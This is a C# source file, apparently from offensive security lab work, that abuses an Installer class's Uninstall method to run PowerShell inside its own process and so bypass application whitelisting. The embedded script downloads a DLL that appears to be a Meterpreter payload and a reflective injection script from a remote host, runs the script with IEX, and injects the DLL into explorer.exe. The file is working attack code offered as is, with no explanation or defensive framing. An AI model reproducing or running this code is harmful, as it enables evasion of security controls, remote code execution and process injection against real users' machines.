using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Entry
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            //example download dll  and reflectively load it into a process.
            string cmd = "_ " +
                "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');_ " +
                "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX;_ " +
                "$procid = (Get-Process -Name explorer).Id;_ " +
                "Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";


            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}